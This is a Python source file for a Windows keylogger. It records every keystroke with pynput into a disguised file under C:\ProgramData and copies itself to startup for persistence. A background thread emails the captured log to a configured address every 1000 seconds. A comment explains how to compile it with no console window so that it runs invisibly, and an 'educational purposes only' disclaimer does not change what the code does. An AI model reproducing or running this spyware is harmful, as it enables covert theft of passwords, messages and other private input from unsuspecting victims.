import ssl, _thread, time, smtplib, batch, encodings.idna  # prevents of "unknown encoding: idna" error
from pynput import keyboard

"""
                            +---------+
                            |IMPORTANT|
                            +---------+
                        *******************
              This program has been created only for educational 
                purposes. It shouldn't be used in illegal way!
                        *******************



todo:
-linux support
-file encrypting on sender side and decrypting on receiver side
-file doesnt move itself when is in right directory

TO MAKE IT INVISIBLE USE "pyinstaller --onefile --noconsole" and run file!
"""


# path to file
def path():
    return r"C:\ProgramData\ProgramData"


# creates file if doesnt exists
def create_file():
    f = open(path(), 'a+')
    try:
        f.write("")
    except FileNotFoundError:
        print("can't write")
    finally:
        f.close()


# saves keys from onpress() function to txt file
def save_to_file(char):
    with open(path(), 'a') as f:
        try:
            f.write(char)
        except TypeError:
            f.write("\nUNKNOWN.KEY\n")  # support for other special keys (like Fn key in notebooks)
        finally:
            f.close()


# read from file, output is directly sended to send_on_email function
def read_from_file():
    with open(path(), 'r') as f:
        return f.read()


# Thread, sends data received from read_from_file function on email address
# smtp.wp.pl uses SSL encryption
def send_on_email(delay):
    port = 465
    smtp_server = ""  # smtp server
    sender = ""  # sender email
    password = ""  # sender password
    receiver = ""  # receiver email
    context = ssl.create_default_context()

    while True:
        time.sleep(delay)
        smtp_obj = smtplib.SMTP_SSL(host=smtp_server, port=port, context=context)  # establishing connection with server
        smtp_obj.login(sender, password)                                             # every 1000 seconds
        message = """From: *<sender's name>* <{0}>
To: *<receiver's name>* <{1}>
Subject: Drop

{content}""".format(sender, receiver, content=read_from_file())
        try:
            smtp_obj.sendmail(sender, receiver, message)
            print("---------sended!---------")
        except:
            print("unable to send")
        finally:
            with open(path(), 'w') as f:
                f.write(" ")


# global variable, which  sends letters to save_to_file() function in finally block in onpress() function
read_key = ""


# function reads keys
def on_press(key):
    global read_key  # global variable
    try:
        read_key = key.char  # detect keys
    except AttributeError:
        read_key = "\n" + str(key) + "\n"  # detect special keys
    finally:
        save_to_file(read_key)  # send keys to file


# main function, everything starts here
def main():
    create_file()  # creating file
    batch.move_app_to_startup()  # exe file moves itself to startup
    listener = keyboard.Listener(on_press=on_press)
    _thread.start_new_thread(send_on_email, (1000,))  # infinite thread, sends data every 1000 seconds
    listener.start()
    listener.join()


if __name__ == '__main__':
    main()
